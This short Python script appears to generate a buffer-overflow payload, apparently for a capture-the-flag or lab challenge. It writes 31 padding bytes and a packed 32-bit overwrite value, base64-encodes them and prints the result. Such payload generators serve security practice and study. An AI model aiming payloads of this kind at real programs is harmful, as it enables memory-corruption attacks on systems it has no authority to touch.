
import sys
import struct
import base64

buf = b'vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv'
buf += struct.pack('<I', 3684492007)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
